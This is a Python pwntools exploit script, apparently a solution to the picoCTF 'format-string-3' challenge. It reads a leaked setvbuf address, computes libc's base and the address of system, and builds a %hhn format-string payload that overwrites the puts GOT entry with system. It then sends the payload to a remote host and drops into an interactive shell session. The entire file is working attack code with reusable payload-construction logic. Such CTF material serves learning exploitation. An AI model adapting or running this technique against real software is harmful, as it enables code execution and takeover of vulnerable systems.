from pwn import *

# Exploit configs
binary = ELF('format-string-3_patched')
host = 'rhea.picoctf.net'
port = 54349
#local_libc = ELF('./libc-x.xx.so', checksec=False)
#remote_libc = ELF('./libc6_2.36.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################
def print_list(l):
    for i in l:
        for j in i:
            print(hex(j), end=' ')
            print(j, end=' ')
        print()

def make_FSB_payload(addr, data, pos):
    l = str(hex(data))[2:]
    l = len(l)
    l = (l + l % 2)//2
    print(l)

    data_list = []
    for i in range(l):
        tmp = (data >> 8*i) & 0xff
        data_list.append([tmp, addr + i])
    print_list(data_list)
    print()
    sorted_data = sorted(data_list, key=lambda x: x[0])
    sorted_data.insert(0, [0, 0])
    data_list = []

    for i in range(len(sorted_data) - 1):
        data_list.append([sorted_data[i + 1][0]-sorted_data[i][0], sorted_data[i + 1][1]])

    print_list(data_list)
    p = b''
    tmp = (((1 + 3 + 1) + (1 + 3 + 4)) * l)
    pos = pos + tmp//0x8 + 1

    for i in range(l):
        if(data_list[i][0]==0):
            p+=b'%' + str(pos + i).encode() + b'$hhn'
        else:
            p+= b'%' + str(data_list[i][0]).encode() + b'c' + b'%' + str(pos + i).encode() + b'$hhn'

    tmp2 = (tmp//8 + 1)*8 - len(p)
    p += b'a'*tmp2

    for i in range(l):
        p += p64(data_list[i][1])
    
    return p

if __name__ == '__main__':
    # call with DEBUG to change log level
    # call with GDB to attach gdb
    # call with REMOTE to run against live target
    if args.REMOTE:
        args.GDB = False # disable gdb when working remote
        io = remote(host, port)
#        libc = remote_libc
    else:
#        io = process(binary.path, env={'LD_PRELOAD': remote_libc.path})
        io = process(binary.path)
#        libc = remote_libc
    if not args.REMOTE:
        for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
            mmap = mmap.decode()
            if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
                binary.address = int(mmap.split('-')[0],16)
                break
    c = [
    'info registers',
    ]
    b = [0x4012e3-0x3fe000, 0x4012f2-0x3fe000]
    launch_gdb(breakpoints=b)
    got_puts = 0x404018
    libc_setvbuf_off = 0x7a3f0
    libc_system_off = 0x4f760
    libc_base = 0x00

    io.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc:")
    setvbuf_addr = io.recvline()[:-1]
    setvbuf_addr = int(setvbuf_addr.decode(), 16)
    libc_base = setvbuf_addr - libc_setvbuf_off
    system_addr = libc_base + libc_system_off
    print(hex(system_addr))
    p = make_FSB_payload(got_puts, system_addr, 38)
    print(p)
    io.sendline(p)
    io.interactive()
